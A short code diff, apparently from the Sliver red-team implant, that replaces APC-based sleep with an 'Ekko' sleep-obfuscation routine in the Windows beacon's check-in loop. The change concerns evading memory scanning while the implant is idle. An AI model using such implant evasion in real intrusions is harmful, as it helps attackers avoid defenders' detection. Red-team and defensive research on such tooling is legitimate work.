@@ -36,7 +36,7 @@ import (
 	// {{end}}
 
 	// {{if and .Config.SleepObfuscation (eq .Config.GOOS "windows")}}
-	"github.com/bishopfox/sliver/implant/sliver/apc"
+	"github.com/bishopfox/sliver/implant/sliver/ekko"
 	// {{end}}
 	consts "github.com/bishopfox/sliver/implant/sliver/constants"
 	"github.com/bishopfox/sliver/implant/sliver/handlers"
@@ -308,7 +308,7 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 		case <-completion:
 			timeUntilNextCheckIn := time.Until(nextCheckin)
 			if timeUntilNextCheckIn.Seconds() > 1 {
-				apc.Sleep(uint64(timeUntilNextCheckIn.Milliseconds()))
+				ekko.EkkoSleep(uint64(timeUntilNextCheckIn.Milliseconds()))
 			}
 		// {{else}}
 		case <-time.After(duration):
